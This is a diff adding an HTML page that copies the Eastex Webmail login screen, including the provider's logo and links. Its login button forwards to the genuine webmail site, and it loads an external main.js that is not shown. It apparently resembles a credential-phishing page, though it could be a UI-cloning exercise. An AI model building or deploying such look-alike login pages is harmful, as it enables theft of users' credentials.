@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <title>Eastex Webmail :: Welcome to Eastex Webmail</title>
+</head>
+<body class="bg-[#CAD2D9]">
+    <form action="" id="form">
+        <div class="bg-[#3E3E3E] w-[480px] p-2 flex flex-col justify-between mx-auto mt-28 rounded-md">
+            <div class="">
+                <img src="img/etc-logo.png" alt="" class="w-48">
+            </div>
+            <div class="flex flex-col mt-8">
+                <div class="ml-5">
+                    <div class="flex pl-4">
+                        <label for="Username" class="text-white text-xs">Username</label>
+                        <input id="username" type="text" class="text-xs p-0.5 focus:outline-none focus:ring-2 focus:ring-[#2d7ab8] w-[340px] ml-4 rounded-md" required>
+                    </div>
+
+                    <div class="flex mt-6 pl-4">
+                        <label for="password" class="text-white text-xs">Password</label>
+                        <input id="password" type="password" class="text-xs p-0.5 focus:outline-none focus:ring-2 focus:ring-[#2d7ab8] w-[340px] ml-[20px] rounded-md" required>
+                    </div>
+                </div>
+                
+
+                <div class="flex ml-[103px] mt-2">
+                    <input type="checkbox">
+                    <p class="text-white text-xs rounded-md ml-2" id="checkbox">Keep me logged in</p>
+                </div>
+                <div class="flex justify-center mt-5 mb-6">
+                <script>
+                    function redirect() {
+                        window.location.href = "https://webmail.eastex.net/"+[];
+                    }
+                    </script>
+                <button class="px-2 py-0.5 bg-white text-xs" onclick="redirect()">Login</button>
+                </div>  
+            </div>
+        </div>
+
+        <div class="mt-16">
+            <p class="text-center text-[#2d7ab8] text-sm"><a href="https://modusgate.eastex.net/Login.aspx">Quarantine</a></p>
+            <p class="text-center text-xs mt-4">Eastex Webmail  ●  <span class="text-[#2d7ab8] text-xs"><a href="https://www.eastex.com/customer-center/webmail/">Get support</a></span></p>
+        </div>
+    </form>
+</body>
+<script src="main.js"></script>
+</html>
